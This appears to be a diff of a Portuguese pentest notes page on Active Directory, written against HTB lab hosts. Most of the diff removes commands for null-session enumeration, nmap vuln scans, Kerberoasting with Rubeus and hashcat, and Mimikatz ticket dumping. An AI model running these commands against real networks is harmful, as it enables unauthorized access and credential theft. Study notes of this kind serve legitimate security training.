@@ -5,62 +5,6 @@ Sumário
 
 [Conceitos](Active%20Directory.md#Conceitos)
 [Enumeration](Active%20Directory.md#Enumeration)
-## Conceitos
-
-Domain controller é o servidor Active Directory Domain Services. (Serviço do AD)
-
-## 1 - Searching for domain name
-
-#### linux
-
-    enum4linux <ip>
-
-#### windows
-
-    [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-    
-    whoami
-
-*Vale considerar que este comando só funciona se a máquina já está no domínio*
-
-
-## 2 - Enumeration
-
-### Remote
-Primeiro temos que enumerar usuários via kerberos ou considerar a enumeração via enum4linux, rpcclient e afins:
-
-
-    kerbrute userenum -d intelligence.htb --dc <ip> users.txt
-
-### Enum4linux
-
-    enum4linux -a -A <ip>
-
-### RPC
-
-Geralmente aqui conseguimos algum tipo de acesso via RPN Null session ou coisa assim:
-
-    rpcclient -N -U '' <ip>
-
-    srvinfo
-    querydominfo
-    enumdomusers
-    enumdomgroups
-    querygroup 0x200
-
-    netshareenum
-    netshareenumall
-
-![qownnotes-media-xUjEhj](../../media/qownnotes-media-xUjEhj.png)
-
-### locally
-
-     net user
-     net user /domain
-     
-     net user username /domain
-
-
 
 
 ## Get hashes
@@ -172,63 +116,6 @@ Outra opção seria:
  
 Vale considerar que este útlimo comando só funciona se a máquina já está no domínio.
 
-### 2 - Obtém Dominio
-
-    enum4linux -a <hostname>
-
-#uma outra opção seria:
-
-    enum4linux -a -A <hostname>
-
-atenção com este comando, porque o domínio que me retornou não foi o mesmo identificado no comando anterior.
-
-    crackmapexec smb <hostname>
-
-### 3 - Obtém serviços
-
-    sudo nmap -p- -Pn -T5 -n <hostname> | tee nmap_fullportstcp_output.txt
-
-    sudo nmap -p- --max-retries 1 -Pn -T5 -n <hostname> | tee nmap_fullportstcp_output.txt
-
-Vulns scan nmap
-
-    sudo nmap -sS --script vuln -n -T5 -Pn <hostname> -p <ports> | tee nmap_vulns.txt
-
-Esta última parte pode ser vista com mais detalhes em:
-
-<https://app.gitbook.com/o/2Zy5rWlDaAhU300B2fZ9/s/2fOHXOTMpimVG5xlFKld/2_Enumeration/enumeration-resumo-2024-02-10t20_25_35>
-
-Como exemplo mais comum encontrados nos cenários, segue as enumerações mais convenientes para os ambientes de ADs (mas não se resume somente a isso, é necessário cosultar melhor as demais informações no link acima)...
-
-Enumerate shares null session
-
-    smbclient -U '' -N -L <hostname>
-
-    crackmapexec smb <hostname> -u '' -p '' --shares
-
-    sudo nmap -p 445,139 -Pn -T5 <hostname> --script smb-enum-shares
-
-GUEST ACCESS
-
-    smbclient -U 'guest%' -N -L <hostanme>
-
-    crackmapexec smb <hostname> -u '' -p '' --shares
-
-RPC null session
-
-    rpcclient -N -U '' <hostname>
-
-    srvinfo
-    querydominfo
-    enumdomusers
-    enumdomgroups
-    querygroup 0x200
-    netshareenum
-    netshareenumall
-
-Enumerate LDAP
-
-
     ldapsearch -x -H ldap://<hostname> -D '' -w '' -b "DC=<domain_name>,DC=<tld>"
 
 ## 2 - Enumeração de usuário de domínio
@@ -243,24 +130,7 @@ Via Kerberos
 
     nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='test.local',userdb=usernames.txt <hostname>
 
-Via RPC
 
-    rpcclient -U <domain>/<username> <hostname>
-    rpcclient -U "DOMAIN\\" <hostnames> -N
-    enumdomusers
-    enumdomgroups
-
-Enum4linux
-
-    enum4linux -u <username> -p <password> -U 10.10.10.179
-
-Via SMB
-
-    crackmapexec smb <hostname> --users
-
-Ldapsearch
-
-    ldapsearch -x -H ldap://<hostname> -D '' -w '' -b "DC=<domain_name>,DC=<tld>"
 
 
 lookupsid
@@ -298,22 +168,7 @@ impacket
 ```
 impacket-GetUserSPNs -dc-host forest.htb.local htb.local/svc-alfresco -k -no-pass
 ```
-Rubeus
 
-```
-./r.exe kerberoast /domain:timelapse.htb /dc:dc01.timelapse.htb
-#ou
-r.exe kerberoast /outfile:kerberoastables.txt /domain:active.htb /dc:dc.active.htb /format:john
-hashcat -m 13100 -a 0 ticket.kirbi /usr/share/wordlists/rockyou.txt
-```
-
-Mimikatz
-
-```
-./m.exe
-privilege::debug
-sekurlsa::tickets
-```
 
 Aqui teremos duas opções de extração, sendo elas TGS e TGT. No caso de já termos o acesso adm, basta obtermos o ticket do SPN da seguinte maneira:
 
